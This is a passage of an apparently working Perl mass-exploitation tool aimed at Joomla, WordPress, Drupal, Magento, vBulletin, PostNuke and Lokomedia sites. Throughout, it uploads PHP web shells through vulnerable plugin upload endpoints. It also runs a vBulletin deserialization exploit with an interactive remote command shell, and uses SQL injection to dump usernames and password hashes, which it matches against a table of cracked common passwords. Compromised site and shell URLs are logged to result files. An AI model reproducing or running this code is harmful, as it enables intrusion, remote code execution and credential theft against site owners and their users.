$filee="one.zip";
$filezz="l.html.j";
my $exploitx = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"M0B", mail=>"M0B\@gmail.com", filetitle =>"M0B", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$filee"], pic_upload=>["$filezz"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);
if ($exploitx->content =~ /The file was successfully transferred to the server/) {


my $response = $ua->get("$def")->status_line;
if ($response =~ /200/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Jdownloads Index";
print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Index Uploaded Successfully\n";
print color('bold white'),"  [Link] => $def\n";
open (TEXT, '>>Result/index.txt');
print TEXT "$def\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Jdownloads Index";
print color('bold red'),"[FAILED]\n";
        }
}
else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Jdownloads Index";
print color('bold red'),"[FAILED]\n";

}
}
################ comfabrik
sub comfabrik(){
my $url = "$site/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1";
my $shell ="l.php";
my $field_name = "Filedata";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => ["userfile" => ["$shell"], "name" => "me.php", "drop_data" => "1", "overwrite" => "1", "field_delimiter" => ",", "text_delimiter" => "&quot;", "option" => "com_fabrik", "controller" => "import", "view" => "import", "task" => "doimport", "Itemid" => "0", "tableid" => "0"]
           
            );

$comfabrikupp="$site/media/l.php?X=M0B";

$checkcomfabrikupp = $ua->get("$comfabrikupp")->content;
if($checkcomfabrikupp =~/M0B/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Fabrik";
print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $comfabrikupp\n";
open (TEXT, '>>Result/index.txt');
print TEXT "$comfabrikupp\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Fabrik";
print color('bold red'),"[FAILED]\n";
  comjdownloadsdef();
}
}
################ comfabrik2
 sub comfabrik2(){
 my $url = "$site/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload";
 my $shell ="l.php";
 
 my $response = $ua->post( $url,
             Content_Type => 'form-data',
             Content => ["file" => ["$shell"]]
            
             );
 
 $comfabrikupp2="$site/l.php?X=M0B";
 
 $checkcomfabrikupp = $ua->get("$comfabrikupp2")->content;
 if($checkcomfabrikupp =~/M0B/) {
 
 print color('bold red'),"[";
 print color('bold green'),"+";
 print color('bold red'),"] ";
 print color('bold white'),"Com Fabrik2";
 print color('bold green'),"[VULNERABLE]\n";
 print color('bold green')," [";
 print color('bold red'),"+";
 print color('bold green'),"] ";
 print color('bold white'),"Shell Uploaded Successfully\n";
 print color('bold white'),"  [Link] => $comfabrikupp2\n";
 open (TEXT, '>>Result/shells.txt');
 print TEXT "$comfabrikupp\n";
 close (TEXT);
 }else{
 print color('bold red'),"[";
 print color('bold green'),"+";
 print color('bold red'),"] ";
 print color('bold white'),"Com Fabrik2";
 print color('bold red'),"[FAILED]\n";
 }
 }
sub comjdownloadsdef(){
$def = $site . '/images/jdownloads/screenshots/l.html.j';
$filee="one.zip";
$filezz="l.html.j";
my $exploitx = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"M0B", mail=>"MOB\@gmail.com", filetitle =>"M0B", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$filee"], pic_upload=>["$filezz"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);
if ($exploitx->content =~ /The file was successfully transferred to the server/) {


my $response = $ua->get("$def")->status_line;
if ($response =~ /200/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Jdownloads Index";
print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Index Uploaded Successfully\n";
print color('bold white'),"  [Link] => $def\n";
open (TEXT, '>>Result/index.txt');
print TEXT "$def\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Jdownloads Index";
print color('bold red'),"[FAILED]\n";
        }
}
else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Jdownloads Index";
print color('bold red'),"[FAILED]\n";
}
}
################ comfabrik index
sub comfabrikdef(){
my $url = "$site/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1";
my $index ="mob.txt";
my $field_name = "Filedata[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => ["userfile" => ["$index"], "name" => "me.php", "drop_data" => "1", "overwrite" => "1", "field_delimiter" => ",", "text_delimiter" => "&quot;", "option" => "com_fabrik", "controller" => "import", "view" => "import", "task" => "doimport", "Itemid" => "0", "tableid" => "0"]
           
            );

$comfabrikup="$site/media/mob.txt";

$checkcomfabrikup = $ua->get("$comfabrikup")->content;
if($checkcomfabrikup =~/M0B/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Fabrik Index";
print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"File Uploaded Successfully\n";
print color('bold white'),"  [Link] => $comfabrikup\n";
open (TEXT, '>>Result/shells.txt');
print TEXT "$comfabrikup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Fabrik Index";
print color('bold red'),"[FAILED]\n";
}
}
################ foxcontact #####################
sub foxcontact(){

@foxvuln= ("components/com_foxcontact/lib/file-uploader.php?cid={}&mid={}&qqfile=/../../_func.php",
"index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id={}?cid={}&mid={}&qqfile=/../../_func.php",
"index.php?option=com_foxcontact&amp;view=loader&amp;type=uploader&amp;owner=module&amp;id={}&cid={}&mid={}&owner=module&id={}&qqfile=/../../_func.php",
"components/com_foxcontact/lib/uploader.php?cid={}&mid={}&qqfile=/../../_func.php");
OUTER: foreach $foxvuln(@foxvuln){
chomp $foxvuln;

my $url = "$site/$foxvuln";

my $shell ="l.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["$shell"] ]);

$foxup="$site/components/com_foxcontact/_func.php?X=M0B";
}
my $checkfoxup = $ua->get("$foxup")->content;
if ($checkfoxup =~ /M0B/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Foxcontact";
print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $foxup\n";
open (TEXT, '>>Result/shells.txt');
print TEXT "$foxup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Foxcontact";
print color('bold red'),"[FAILED]\n";
}
}
################ comadsmanager #####################
sub comadsmanager(){
my $url = "$site/index.php?option=com_adsmanager&task=upload&tmpl=component";

my $response = $ua->post( $url,
            Cookie => "", Content_Type => "form-data", Content => [file => ["m.jpg"], name => "m.html"]
           
            );

$comadsmanagerup="$site/tmp/plupload/m.html";

$checkcomadsmanagerup = $ua->get("$comadsmanagerup")->content;
if($checkcomadsmanagerup =~/HACKED By/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Ads Manager";
print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"File Uploaded Successfully\n";
print color('bold white'),"  [Link] => $comadsmanagerup\n";
open (TEXT, '>>Result/index.txt');
print TEXT "$comadsmanagerup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Ads Manager";
print color('bold red'),"[FAILED]\n";
}
}
sub comblog(){

my $url = "$site/index.php?option=com_myblog&task=ajaxupload";
my $checkblog = $ua->get("$url")->content;
if($checkblog =~/has been uploaded/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Blog";
print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"TRY To exploit it , but it doesn't work all times :(\n";
    open(save, '>>Result/vulntargets.txt');   
    print save "[blog] $site\n";   
    close(save);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Blog";
print color('bold red'),"[FAILED]\n";
}
}

sub comusers(){

my $url = "$site/index.php?option=com_users&view=registration";
my $checkomusers = $ua->get("$url")->content;
if($checkomusers =~/jform_email2-lbl/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Users";
print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"TRY To exploit it , but it doesn't work all times :(\n";
    open(save, '>>Result/vulntargets.txt');   
    print save "[Com Users] $site\n";   
    close(save);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Users";
print color('bold red'),"[FAILED]\n";
}
}
################ comweblinks
sub comweblinks(){
    $ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (30);
$ua->cookie_jar(
        HTTP::Cookies->new(
            file => 'mycookies.txt',
            autosave => 1
        )
    );
$urlone ="$site/index.php?option=com_media&view=images&tmpl=component&e_name=jform_description&asset=com_weblinks&author=";
$token = $ua->get($urlone)->content;
if($token =~/<form action="(.*?)" id="uploadForm"/)
{
$url=$1;
}

my $index ="m.gif";
my $field_name = "Filedata[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$index"] ]
           
            );

$weblinksup= "$site/images/m.gif";
$check = $ua->get($weblinksup)->status_line;
if ($check =~ /200/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Weblinks";
print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Picture Uploaded Successfully\n";
print color('bold white'),"  [Link] => $weblinksup\n";
open (TEXT, '>>Result/index.txt');
print TEXT "$weblinksup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Weblinks";
print color('bold red'),"[FAILED]\n";
}
}
################ mod_simplefileupload #####################
sub mod_simplefileupload(){
    $ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (30);

$url ="$site/modules/mod_simplefileuploadv1.3/elements/udd.php";
$simplefileuploadsup= "$site/modules/mod_simplefileuploadv1.3/elements/l.php?X=M0B";

my $shell ="l.php";

my $response = $ua->post( $url, Content_Type => "multipart/form-data", Content => [ file=>["$shell"] , submit=>"Upload" ]);

$check = $ua->get($simplefileuploadsup)->content;
if ($check =~ /M0B/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"mod_simplefileupload";
print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $simplefileuploadsup\n";
open (TEXT, '>>Result/shells.txt');
print TEXT "$simplefileuploadsup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"mod_simplefileupload";
print color('bold red'),"[FAILED]\n";
}
}
#################
######## DRUPAL
sub drupal(){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);

# upload da fucking php script [drupal.php] in your localhost [linux upload in apache2] 
$drupalink = "http://127.0.0.1/drupal.php";
my $exploit = "$drupalink?url=$site&submit=submit";
$admin ="M0B";
$pass  ="M0B";
$dr = $site . '/user/login';
$red = $site . '/user/1';
my $checkk = $ua->get("$exploit")->content;
if($checkk =~/Success!/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Drupal Add Admin";
print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"URL : $dr\n";
print color('bold white'),"USER : $admin\n";
print color('bold white'),"PASS : $pass\n";
open (TEXT, '>>Result/drupal.txt');
print TEXT "\nURL : $dr\n";
print TEXT "USER : $admin\n";
print TEXT "PASS : $pass\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Drupal Add Admin";
print color('bold red'),"[FAILED]\n";
}
}
######################
########MAGENTO
sub magento(){

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);
print"$site ";


$magentoxlink = "http://localhost/magentox.php";
my $exploitspymag = "$magentoxlink?url=$site&submit=submit";
my $checkksbir = $ua->get("$exploitspymag")->content;
if($checkksbir =~/Success /) {

    print color('bold green');
print "[Success]\n";
    print color('reset');
    open(save, '>>Result/magento.txt');
    print save "[Magento] $site hydra|hydra77\n";
    close(save);
    }
else{
    print color('bold red');
print  "[Failed]\n";
    print color('reset');
}
}
################
#### VBULLETIN
sub vbulletin(){
	$response=$ua->get($site . '/ajax/api/hook/decodeArguments?arguments=O:12:"vB_dB_Result":2:{s:5:"%00*%00db";O:11:"vB_Database":1:{s:9:"functions";a:1:{s:11:"free_result";s:6:"system";}}s:12:"%00*%00recordset";s:20:"echo%20$((0xfee10000))";}');
 
$source=$response->decoded_content;
if (($source =~ m/4276158464/i))
{
    $response=$ua->get($site . '/ajax/api/hook/decodeArguments?arguments=O:12:"vB_dB_Result":2:{s:5:"%00*%00db";O:11:"vB_Database":1:{s:9:"functions";a:1:{s:11:"free_result";s:6:"system";}}s:12:"%00*%00recordset";s:6:"whoami";}');
    $user=$response->decoded_content;
    chomp($user);
    print "\n[+] Target Vulnerable :)\n";
    open(save, '>>Result/vulnVBULLETIN.txt');   
    print save "$site\n";   
    while($cmd=="exit")
    {
        print "\n\n$user\$ ";
        $cmd=<STDIN>;
        chomp($cmd);
        if($cmd =~ m/exit/i){exit 0;}
        $len=length($cmd);
        $response=$ua->get($site . '/ajax/api/hook/decodeArguments?arguments=O:12:"vB_dB_Result":2:{s:5:"%00*%00db";O:11:"vB_Database":1:{s:9:"functions";a:1:{s:11:"free_result";s:6:"system";}}s:12:"%00*%00recordset";s:'.$len.':"'.$cmd.'";}');
        print "\n".$response->decoded_content;
 
   }
}else{print "\n[+] Target is not Vulnerable\n\n"}
}
###############
#### POSTNUKE
sub postnuke(){
	
$site = @ARGV[0];
print "[+] Connecting to $site\n";
 
$injection = "$site\/?";
$injection .= "op=modload&name=Messages&file=readpmsg&start=0";
$injection .= "%20UNION%20SELECT%20pn_uname,null,pn_uname,pn_pass,pn_pass,null,pn_pass,null";
$injection .= "%20FROM%20pn_users%20WHERE%20pn_uid=2\/*&total_messages=1";
 
$socket = new IO::Socket::INET (PeerAddr => "$site",
                                PeerPort => 80,
                                Proto => 'tcp');
                                die unless $socket;
 
print "[+] Injecting command ...\n";
print $socket "GET http://$injection HTTP/1.1\nHost: $site\n\n";
    open(save, '>>Result/postnuke.txt');   
    print save "http://$injection HTTP/1.1\nHost: $site\n";  
while (<$socket>)
{
 print $_;
}
}
################ lokomedia #####################
sub lokomedia(){
$lokoversion = "$site/statis--7'union select /*!50000Concat*/(Version())+from+users--+--+kantordesa.html";
$lokodatabase = "$site/statis--7'union select /*!50000Concat*/(Database())+from+users--+--+kantordesa.html";
$lokouserdata = "$site/statis--7'union select /*!50000Concat*/(USER())+from+users--+--+kantordesa.html";
$lokouser = "$site/statis--7'union select /*!50000Concat*/(username)+from+users--+--+kantordesa.html";
$lokopass = "$site/statis--7'union select /*!50000Concat*/(password)+from+users--+--+kantordesa.html";

my $checklokoversion = $ua->get("$lokoversion")->content;
if($checklokoversion =~/<meta name="description" content="(.*)">/) {
$dbv=$1;

if($dbv =~ /[a-z]/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white')," MySQL Version : $dbv\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\n[ DATABASE ]\n";
print TEXT "$site";
print TEXT "\nMySQL Version : $dbv";
close (TEXT);
my $checklokodatabase = $ua->get("$lokodatabase")->content;
if($checklokodatabase =~/<meta name="description" content="(.*)">/) {
$db=$1;
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white')," Current Database : $db\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nCurrent Database : $db";
close (TEXT);
}
my $checklokouserdata = $ua->get("$lokouserdata")->content;
if($checklokouserdata =~/<meta name="description" content="(.*)">/) {
$udb=$1;
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white')," Current Username : $udb\n";
}
my $checklokouser = $ua->get("$lokouser")->content;
if($checklokouser =~/<meta name="description" content="(.*)">/) {
$user=$1;
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white')," Username : $user\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nUsername : $user";
close (TEXT);
}
my $checklokopass = $ua->get("$lokopass")->content;
if($checklokopass =~/<meta name="description" content="(.*)">/) {
$hash=$1;
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white')," Hash Pass : $hash\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nHash Pass : $hash";
close (TEXT);
lokohash();
lokopanel();
}
}
}
}
sub lokohash(){
if ($hash =~ /a66abb5684c45962d887564f08346e8d/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : admin123456\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : admin123456";
close (TEXT);
}
elsif ($hash =~ /0192023a7bbd73250516f069df18b500/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : admin123\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : admin123";
close (TEXT);
}
elsif ($hash =~ /73acd9a5972130b75066c82595a1fae3/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : ADMIN\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : ADMIN";
close (TEXT);
}
elsif ($hash =~ /7b7bc2512ee1fedcd76bdc68926d4f7b/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : Administrator\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : Administrator";
close (TEXT);
}
elsif ($hash =~ /c21f969b5f03d33d43e04f8f136e7682/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : default\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : default";
close (TEXT);
}
elsif ($hash =~ /1a1dc91c907325c69271ddf0c944bc72/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : pass\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : pass";
close (TEXT);
}
elsif ($hash =~ /5f4dcc3b5aa765d61d8327deb882cf99/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : password\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : password";
close (TEXT);
}
elsif ($hash =~ /098f6bcd4621d373cade4e832627b4f6/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : test\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : test";
close (TEXT);
}
elsif ($hash =~ /21232f297a57a5a743894a0e4a801fc3/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : admin\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : admin";
close (TEXT);
}
elsif ($hash =~ /fe01ce2a7fbac8fafaed7c982a04e229/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : demo\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : demo";
close (TEXT);
}
else{
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : ";
print color('bold red'),"NOt FOUND\n";
}
}

sub lokopanel(){
$ua = LWP::UserAgent->new();
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout(15);
$pathone = "$site/redaktur";
my $lokomediacms = $ua->get("$pathone")->content;
if($lokomediapathone =~/administrator|username|password/) {
  print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Admin Panel : ";
print color('bold green'),"Found!\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"URL : $pathone\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nURL : $pathone";
close (TEXT);
}
else{
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Admin Panel : ";
print color('bold red'),"NOt FOUND\n";
}
}

#################
###### WORDPRESS
################ levoslideshow
sub levoslideshow(){

my $url = "$site/wp-admin/admin.php?page=levoslideshow_manage";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["l.php"], task => 'lvo_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/levoslideshow\/(.*?)\/big\/l.php/) {
$uploadfolder=$1;
$levoslideshowup="$site/wp-content/uploads/levoslideshow/$uploadfolder/big/l.php?X=M0B";
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"levoslideshow";
print color('bold white'),"";
print color('bold green'),"[VULNERABLE]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $levoslideshowup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$levoslideshowup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"levoslideshow";
print color('bold red'),"[FAILED]";
print color('bold white'),"\n";
}
}

################ Formcraft
sub formcraft(){
my $url = "$site/wp-content/plugins/formcraft/file-upload/server/php/";
my $shell ="l.php";
my $field_name = "files[]";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$formcraftup="$site/wp-content/plugins/formcraft/file-upload/server/php/files/l.php?X=M0B";

if ($response->content =~ /{"files/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Formcraft";
print color('bold green'),"[VULNERABLE]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $formcraftup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$formcraftup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Formcraft";
print color('bold red'),"[FAILED]";
print color('bold white'),"\n";
}
}
################ Adblock Blocker #####################
sub addblockblocker(){

my $addblockurl = "$site/wp-admin/admin-ajax.php?action=getcountryuser&cs=2";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [popimg => ["l.php"],]);
$addblockup="$site/wp-content/uploads/$year/$month/l.php?X=M0B";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/M0B/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Adblock Blocker";

print color('bold white'),"";
print color('bold green'),"[VULNERABLE]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $addblockup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Adblock Blocker";

print color('bold red'),"[FAILED]";
print color('bold white'),"\n";}
}

################ Blaze #####################
sub blaze(){
my $url = "$site/wp-admin/admin.php?page=blaze_manage";
my $blazeres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["l.php"], task => 'blaze_add_new_album', album_name => '', album_desc => '',]);

if ($blazeres->content =~ /\/uploads\/blaze\/(.*?)\/big\/l.php/) {
$uploadfolder=$1;
$blazeup="$site/wp-content/uploads/blaze/$uploadfolder/big/l.php?X=M0B";
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Blaze";

print color('bold white'),"";
print color('bold green'),"[VULNERABLE]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $blazeup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$blazeup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Blaze";

print color('bold red'),"[FAILED]";
print color('bold white'),"\n";
}
}

################ Catpro #####################
sub catpro(){

my $url = "$site/wp-admin/admin.php?page=catpro_manage";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["l.php"], task => 'cpr_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/catpro\/(.*?)\/big\/l.php/) {
$uploadfolder=$1;
$catproup="$site/wp-content/uploads/catpro/$uploadfolder/big/l.php?X=M0B";
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Catpro";

print color('bold white'),"";
print color('bold green'),"[VULNERABLE]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $catproup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$catproup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Catpro";

print color('bold red'),"[FAILED]";
print color('bold white'),"\n";
}
}


################ Cherry Plugin #####################
sub cherry(){

my $url = "$site/wp-content/plugins/cherry-plugin/admin/import-export/upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file => ["l.php"],]);

$cherryup="$site/wp-content/plugins/cherry-plugin/admin/import-export/l.php?X=M0B";

my $checkcherry = $ua->get("$cherryup")->content;
if($checkcherry =~/M0B/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Cherry Plugin";

print color('bold white'),"";
print color('bold green'),"[VULNERABLE]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
